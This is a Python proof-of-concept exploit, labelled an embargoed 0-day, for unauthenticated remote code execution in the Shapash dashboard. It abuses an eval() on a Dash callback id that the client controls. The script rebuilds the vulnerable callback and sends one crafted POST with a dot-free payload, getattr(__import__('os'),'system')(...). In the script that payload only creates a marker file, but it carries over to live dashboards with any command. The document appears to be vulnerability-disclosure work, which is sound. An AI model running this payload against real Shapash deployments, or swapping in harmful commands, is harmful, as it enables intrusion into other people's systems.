# EMBARGOED 0-day PoC - shapash dashboard RCE. Do NOT publish before coordinated disclosure.
#!/usr/bin/env python3
"""PoC: unauthenticated RCE in Shapash's web dashboard via eval() on a Dash callback id.

Shapash (shapash/webapp/smart_app.py, layout_filter callback) runs:

    button_id = ctx.triggered[0]["prop_id"].split(".")[0]
    ...
    else:
        filter_id_to_remove = eval(button_id)["index"]        # <-- smart_app.py:2997

`ctx.triggered[0]["prop_id"]` is derived from the `changedPropIds` field of the client's
POST to /_dash-update-component, so an attacker who can reach the running dashboard controls
`button_id` and therefore the argument to eval() -> arbitrary Python execution (RCE).

This PoC replicates the exact vulnerable callback, starts the Dash app's Flask test client,
and sends ONE crafted callback request. It is non-destructive: the injected command only
creates a local marker file to prove code execution. Verified on dash 2.18.2 (shapash pins
dash>=2.3.1,<3.0.0).

    pip install "dash>=2.3.1,<3.0.0"
    python3 poc.py
"""
import glob
import json
import os

import dash
from dash import html
from dash.dependencies import ALL, Input, Output, State

MARKER = os.path.abspath("SHAPASH_RCE_PROOF")


def build_app():
    app = dash.Dash(__name__)
    app.layout = html.Div(
        [
            html.Button(id="add_dropdown_button"),
            html.Button(id="reset_dropdown_button"),
            html.Div(id="dropdowns_container"),
            html.Div(id="name"),
        ]
    )

    # EXACT vulnerable pattern from shapash/webapp/smart_app.py (layout_filter)
    @app.callback(
        Output("dropdowns_container", "children"),
        [
            Input("add_dropdown_button", "n_clicks"),
            Input("reset_dropdown_button", "n_clicks"),
            Input({"type": "del_dropdown_button", "index": ALL}, "n_clicks"),
        ],
        [State("dropdowns_container", "children"), State("name", "value")],
        prevent_initial_call=True,
    )
    def layout_filter(n_add, n_reset, n_del, currents_filters, name):
        ctx = dash.callback_context
        if not ctx.triggered:
            raise dash.exceptions.PreventUpdate
        button_id = ctx.triggered[0]["prop_id"].split(".")[0]
        if button_id == "add_dropdown_button":
            return []
        elif button_id == "reset_dropdown_button":
            return []
        else:
            filter_id_to_remove = eval(button_id)["index"]  # shapash smart_app.py:2997
            return [filter_id_to_remove]

    return app


def main():
    for f in glob.glob(MARKER + "*"):
        os.remove(f)
    app = build_app()
    client = app.server.test_client()

    # Dot-free payload: split(".")[0] keeps it whole. getattr(__import__('os'),'system')
    # contains no '.', so the whole expression survives and eval() executes it.
    evil = f"getattr(__import__('os'),'system')('touch {MARKER}')"
    body = {
        "output": "dropdowns_container.children",
        "outputs": {"id": "dropdowns_container", "property": "children"},
        "inputs": [
            {"id": "add_dropdown_button", "property": "n_clicks"},
            {"id": "reset_dropdown_button", "property": "n_clicks"},
            {"id": {"type": "del_dropdown_button", "index": 0}, "property": "n_clicks", "value": 1},
        ],
        # attacker-controlled field in the HTTP request:
        "changedPropIds": [f"{evil}.n_clicks"],
        "state": [
            {"id": "dropdowns_container", "property": "children"},
            {"id": "name", "property": "value"},
        ],
    }
    client.post(
        "/_dash-update-component",
        data=json.dumps(body),
        headers={"Content-Type": "application/json"},
    )
    hits = glob.glob(MARKER + "*")
    print("attacker-sent changedPropIds[0]:", body["changedPropIds"][0])
    print("RCE marker created:", bool(hits), hits)
    print("RESULT:", "VULNERABLE (code executed)" if hits else "not reproduced")
    for f in hits:
        os.remove(f)


if __name__ == "__main__":
    main()
